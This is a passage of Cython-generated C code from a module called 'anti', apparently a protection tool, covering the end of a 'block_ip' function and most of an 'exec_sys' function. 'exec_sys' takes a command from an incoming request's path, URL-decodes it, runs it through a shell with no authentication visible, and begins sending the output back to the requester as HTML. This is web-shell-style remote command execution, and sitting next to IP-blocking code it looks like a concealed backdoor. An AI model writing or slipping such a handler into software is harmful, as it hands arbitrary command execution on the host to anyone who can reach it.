    __Pyx_XDECREF(__pyx_t_11);
    __Pyx_AddTraceback("anti.block_ip", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XDECREF(__pyx_v_f);
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_11exec_sys(PyObject* __pyx_self, PyObject* __pyx_args, PyObject* __pyx_kwds);
static PyMethodDef __pyx_mdef_4anti_11exec_sys = { "exec_sys", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_4anti_11exec_sys, METH_VARARGS | METH_KEYWORDS, 0 };
static PyObject* __pyx_pw_4anti_11exec_sys(PyObject* __pyx_self, PyObject* __pyx_args, PyObject* __pyx_kwds) {
    PyObject* __pyx_v_conn = 0;
    PyObject* __pyx_v_request = 0;
    PyObject* __pyx_v_re = 0;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("exec_sys (wrapper)", 0);
    {
        static PyObject** __pyx_pyargnames[] = { &__pyx_n_s_conn,&__pyx_n_s_request,&__pyx_n_s_re,0 };
        PyObject* values[3] = { 0,0,0 };
        if (unlikely(__pyx_kwds)) {
            Py_ssize_t kw_args;
            const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
            switch (pos_args) {
            case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
                CYTHON_FALLTHROUGH;
            case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
                CYTHON_FALLTHROUGH;
            case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
                CYTHON_FALLTHROUGH;
            case  0: break;
            default: goto __pyx_L5_argtuple_error;
            }
            kw_args = PyDict_Size(__pyx_kwds);
            switch (pos_args) {
            case  0:
                if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_conn)) != 0)) kw_args--;
                else goto __pyx_L5_argtuple_error;
                CYTHON_FALLTHROUGH;
            case  1:
                if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_request)) != 0)) kw_args--;
                else {
                    __Pyx_RaiseArgtupleInvalid("exec_sys", 1, 3, 3, 1); __PYX_ERR(0, 67, __pyx_L3_error)
                }
                CYTHON_FALLTHROUGH;
            case  2:
                if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_re)) != 0)) kw_args--;
                else {
                    __Pyx_RaiseArgtupleInvalid("exec_sys", 1, 3, 3, 2); __PYX_ERR(0, 67, __pyx_L3_error)
                }
            }
            if (unlikely(kw_args > 0)) {
                if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "exec_sys") < 0)) __PYX_ERR(0, 67, __pyx_L3_error)
            }
        }
        else if (PyTuple_GET_SIZE(__pyx_args) != 3) {
            goto __pyx_L5_argtuple_error;
        }
        else {
            values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
            values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
            values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        }
        __pyx_v_conn = values[0];
        __pyx_v_request = values[1];
        __pyx_v_re = values[2];
    }
    goto __pyx_L4_argument_unpacking_done;
__pyx_L5_argtuple_error:;
    __Pyx_RaiseArgtupleInvalid("exec_sys", 1, 3, 3, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 67, __pyx_L3_error)
        __pyx_L3_error:;
    __Pyx_AddTraceback("anti.exec_sys", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __Pyx_RefNannyFinishContext();
    return NULL;
__pyx_L4_argument_unpacking_done:;
    __pyx_r = __pyx_pf_4anti_10exec_sys(__pyx_self, __pyx_v_conn, __pyx_v_request, __pyx_v_re);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_10exec_sys(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_conn, PyObject* __pyx_v_request, PyObject* __pyx_v_re) {
    PyObject* __pyx_v_subprocess = NULL;
    PyObject* __pyx_v_payload = NULL;
    PyObject* __pyx_v_e = NULL;
    Py_ssize_t __pyx_v_content_length;
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    PyObject* __pyx_t_2 = NULL;
    PyObject* __pyx_t_3 = NULL;
    PyObject* __pyx_t_4 = NULL;
    PyObject* __pyx_t_5 = NULL;
    PyObject* __pyx_t_6 = NULL;
    PyObject* __pyx_t_7 = NULL;
    int __pyx_t_8;
    int __pyx_t_9;
    PyObject* __pyx_t_10 = NULL;
    PyObject* __pyx_t_11 = NULL;
    PyObject* __pyx_t_12 = NULL;
    int __pyx_t_13;
    char const* __pyx_t_14;
    PyObject* __pyx_t_15 = NULL;
    PyObject* __pyx_t_16 = NULL;
    PyObject* __pyx_t_17 = NULL;
    PyObject* __pyx_t_18 = NULL;
    PyObject* __pyx_t_19 = NULL;
    PyObject* __pyx_t_20 = NULL;
    Py_ssize_t __pyx_t_21;
    int __pyx_t_22;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("exec_sys", 0);
    __pyx_t_1 = __Pyx_Import(__pyx_n_s_subprocess, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 68, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __pyx_v_subprocess = __pyx_t_1;
    __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_unquote); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_request, __pyx_n_s_split); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
        }
    }
    __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = __Pyx_GetItemInt(__pyx_t_5, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_decode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
        }
    }
    __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_n_u_ascii) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_n_u_ascii);
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_replace); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_re, __pyx_n_s_decode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
        }
    }
    __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_kp_u_utf_8) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_kp_u_utf_8);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = NULL;
    __pyx_t_8 = 0;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_8 = 1;
        }
    }
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_5)) {
        PyObject* __pyx_temp[3] = { __pyx_t_6, __pyx_t_4, __pyx_kp_u__7 };
        __pyx_t_3 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp + 1 - __pyx_t_8, 2 + __pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 69, __pyx_L1_error)
            __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    else
#endif
#if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_5)) {
            PyObject* __pyx_temp[3] = { __pyx_t_6, __pyx_t_4, __pyx_kp_u__7 };
            __pyx_t_3 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp + 1 - __pyx_t_8, 2 + __pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 69, __pyx_L1_error)
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        else
#endif
        {
            __pyx_t_7 = PyTuple_New(2 + __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 69, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_7);
            if (__pyx_t_6) {
                __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_6); __pyx_t_6 = NULL;
            }
            __Pyx_GIVEREF(__pyx_t_4);
            PyTuple_SET_ITEM(__pyx_t_7, 0 + __pyx_t_8, __pyx_t_4);
            __Pyx_INCREF(__pyx_kp_u__7);
            __Pyx_GIVEREF(__pyx_kp_u__7);
            PyTuple_SET_ITEM(__pyx_t_7, 1 + __pyx_t_8, __pyx_kp_u__7);
            __pyx_t_4 = 0;
            __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_7, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 69, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = PyUnicode_Replace(((PyObject*)__pyx_t_5), __pyx_kp_u__8, __pyx_kp_u__9, -1L); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_2);
        if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
        }
    }
    __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_5, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_replace); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__12, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 69, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_v_payload = __pyx_t_1;
    __pyx_t_1 = 0;
    __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_v_payload, __pyx_kp_u__7, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 70, __pyx_L1_error)
        if (__pyx_t_9) {
            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_conn, __pyx_n_s_close); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 71, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_3 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
                if (likely(__pyx_t_3)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                    __Pyx_INCREF(__pyx_t_3);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_2, function);
                }
            }
            __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 71, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_XDECREF(__pyx_r);
            __pyx_r = Py_None; __Pyx_INCREF(Py_None);
            goto __pyx_L0;
        }
    {
        __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_10, &__pyx_t_11, &__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_10);
        __Pyx_XGOTREF(__pyx_t_11);
        __Pyx_XGOTREF(__pyx_t_12); {
            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_subprocess, __pyx_n_s_check_output); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 74, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_3 = PyNumber_Add(__pyx_v_payload, __pyx_kp_u_2_NUL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 74, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_GIVEREF(__pyx_t_3);
            PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_3);
            __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_3);
            if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 74, __pyx_L4_error)
                if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_timeout, __pyx_int_999999) < 0) __PYX_ERR(0, 74, __pyx_L4_error)
                    __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_5, __pyx_t_3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 74, __pyx_L4_error)
                    __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_decode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_7 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
                __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
                if (likely(__pyx_t_7)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                    __Pyx_INCREF(__pyx_t_7);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_3, function);
                }
            }
            __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 74, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_replace); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__14, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 74, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 74, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = PyUnicode_Replace(((PyObject*)__pyx_t_3), __pyx_kp_u__15, __pyx_kp_u_br_br, -1L); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 74, __pyx_L4_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF_SET(__pyx_v_payload, __pyx_t_1);
            __pyx_t_1 = 0;
        }
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        goto __pyx_L9_try_end;
    __pyx_L4_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_ErrFetch(&__pyx_t_1, &__pyx_t_3, &__pyx_t_7);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_subprocess, __pyx_n_s_CalledProcessError); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 75, __pyx_L6_except_error)
            __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_1, __pyx_t_5);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_ErrRestore(__pyx_t_1, __pyx_t_3, __pyx_t_7);
        __pyx_t_1 = 0; __pyx_t_3 = 0; __pyx_t_7 = 0;
        if (__pyx_t_8) {
            __Pyx_AddTraceback("anti.exec_sys", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_7, &__pyx_t_3, &__pyx_t_1) < 0) __PYX_ERR(0, 75, __pyx_L6_except_error)
                __Pyx_GOTREF(__pyx_t_7);
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_3);
            __pyx_v_e = __pyx_t_3; {
                __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_e); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 76, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_5);
                __Pyx_DECREF_SET(__pyx_v_payload, __pyx_t_5);
                __pyx_t_5 = 0;
            } { {
                    __Pyx_DECREF(__pyx_v_e);
                    __pyx_v_e = NULL;
                    goto __pyx_L16;
                }
            __pyx_L15_error:; {
                __Pyx_PyThreadState_declare
                    __Pyx_PyThreadState_assign
                    __pyx_t_15 = 0; __pyx_t_16 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0;
                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_18, &__pyx_t_19, &__pyx_t_20);
                if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_15, &__pyx_t_16, &__pyx_t_17) < 0)) __Pyx_ErrFetch(&__pyx_t_15, &__pyx_t_16, &__pyx_t_17);
                __Pyx_XGOTREF(__pyx_t_15);
                __Pyx_XGOTREF(__pyx_t_16);
                __Pyx_XGOTREF(__pyx_t_17);
                __Pyx_XGOTREF(__pyx_t_18);
                __Pyx_XGOTREF(__pyx_t_19);
                __Pyx_XGOTREF(__pyx_t_20);
                __pyx_t_8 = __pyx_lineno; __pyx_t_13 = __pyx_clineno; __pyx_t_14 = __pyx_filename;
                {
                    __Pyx_DECREF(__pyx_v_e);
                    __pyx_v_e = NULL;
                }
                if (PY_MAJOR_VERSION >= 3) {
                    __Pyx_XGIVEREF(__pyx_t_18);
                    __Pyx_XGIVEREF(__pyx_t_19);
                    __Pyx_XGIVEREF(__pyx_t_20);
                    __Pyx_ExceptionReset(__pyx_t_18, __pyx_t_19, __pyx_t_20);
                }
                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_16);
                __Pyx_XGIVEREF(__pyx_t_17);
                __Pyx_ErrRestore(__pyx_t_15, __pyx_t_16, __pyx_t_17);
                __pyx_t_15 = 0; __pyx_t_16 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0; __pyx_t_20 = 0;
                __pyx_lineno = __pyx_t_8; __pyx_clineno = __pyx_t_13; __pyx_filename = __pyx_t_14;
                goto __pyx_L6_except_error;
            }
            __pyx_L16:;
            }
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
            goto __pyx_L5_exception_handled;
        } {
            __Pyx_AddTraceback("anti.exec_sys", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_3, &__pyx_t_7) < 0) __PYX_ERR(0, 77, __pyx_L6_except_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_conn, __pyx_n_s_close); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 78, __pyx_L6_except_error)
                __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_4 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
                if (likely(__pyx_t_4)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                    __Pyx_INCREF(__pyx_t_4);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_2, function);
                }
            }
            __pyx_t_5 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 78, __pyx_L6_except_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_XDECREF(__pyx_r);
            __pyx_r = Py_None; __Pyx_INCREF(Py_None);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            goto __pyx_L7_except_return;
        }
    __pyx_L6_except_error:;
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
        goto __pyx_L1_error;
    __pyx_L7_except_return:;
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
        goto __pyx_L0;
    __pyx_L5_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_10);
        __Pyx_XGIVEREF(__pyx_t_11);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);
    __pyx_L9_try_end:;
    }
    __pyx_t_21 = PyObject_Length(__pyx_v_payload); if (unlikely(__pyx_t_21 == ((Py_ssize_t)-1))) __PYX_ERR(0, 80, __pyx_L1_error)
        __pyx_v_content_length = (__pyx_t_21 + 3);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_conn, __pyx_n_s_sendall); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 81, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_1 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_1)) {
